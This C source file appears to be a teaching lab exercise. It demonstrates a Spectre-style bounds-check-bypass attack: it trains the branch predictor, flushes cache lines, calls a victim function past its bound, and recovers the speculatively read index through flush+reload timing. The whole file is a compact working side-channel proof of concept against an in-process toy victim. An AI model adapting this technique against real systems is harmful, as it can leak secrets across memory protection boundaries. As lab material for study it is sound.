#include <emmintrin.h>
#include <x86intrin.h>
#include <stdlib.h>
#include <stdio.h>
#include <stdint.h>

// TODO: Define this threshold based on your previous experiments
// Use it for determining the secret
#define CACHE_HIT_THRESHOLD 250

typedef struct datablock {
	uint8_t lpad[2048];   // Ensures dat is isolated
    uint8_t dat;
    uint8_t rpad[2047];  // Total size = 2048 + 1 + 2047 = 4096 bytes (1 page)
} DataBlock;

int size = 10;
DataBlock array[256];

void flushSideChannel() {
    for (int i = 255; i > -1; i--) 
        _mm_clflush(&array[i].dat);  // Flush only the dat field
}


uint64_t time_eval(uint8_t *addr) {
    // this variable is required by the rdtscp to save the processor ID, so it is just a dummy parameter we will not use
    unsigned int junk;
    uint64_t start = __rdtscp(&junk);
    junk = *addr; // just to access the value of the data, to measure what is time needed to access it.
    uint64_t end = __rdtscp(&junk);
    return end - start;
}


uint8_t reloadSideChannel() {
        int junk = 0;
        uint64_t timeElapse;
        int best_index = 0;
        uint64_t best_time = UINT64_MAX;

    for (int i = 255; i > -1; i--) {
        volatile uint8_t *data = &array[i].dat;
        timeElapse = time_eval(data);
        if (timeElapse < best_time) {
           best_time = timeElapse;
           best_index = i;
        }
    }

    if (best_time <= CACHE_HIT_THRESHOLD) {
        return (uint8_t)best_index;
    } else {
        return 0xFF;
    }
}


void victim(size_t x) {
	if (x < size) {
		uint8_t temp = array[x].dat;
	}
}

int main() {
	// Ensure array is initialized
	for (int i = 0; i < 256; i++) {
	array[i].dat = 1;
	}

	flushSideChannel();

	// EXHIBIT A.1 BEGIN
	for (int i = 0; i < 10; i++) {
		_mm_clflush(&size);   // EXHIBIT B
		victim(i);            // EXHIBIT D
	}
	// EXHIBIT A.1 END

	_mm_clflush(&size);      // EXHIBIT B
	flushSideChannel();      // EXHIBIT C
	victim(97);              // EXHIBIT A.2
	victim(97);              // EXHIBIT A.2
	victim(97);              // EXHIBIT A.2

	int secret = reloadSideChannel();
	printf("The secret is %d.\n", secret);

	return 0;
}
